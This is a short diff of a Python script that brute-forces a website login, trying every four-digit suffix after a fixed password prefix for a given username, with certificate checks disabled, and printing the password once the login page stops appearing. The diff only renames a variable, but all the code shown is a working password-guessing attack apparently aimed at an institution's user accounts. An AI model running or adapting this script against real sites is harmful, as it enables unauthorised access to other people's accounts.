@@ -16,8 +16,8 @@ if not re.match(r"\d{2}\w{3}\d{4}", username):
 
 for suffix in range(9999):
     password = "Vitcc@" + f"{suffix:04}"
-    suc = {'username': username, 'password': password}
-    check = s.post(url, data = suc, verify = False)
+    user_data = {'username': username, 'password': password}
+    check = s.post(url, data = user_data, verify = False)
     if not re.search("Log in to the site", check.text):
         print("password: ", password)
         break
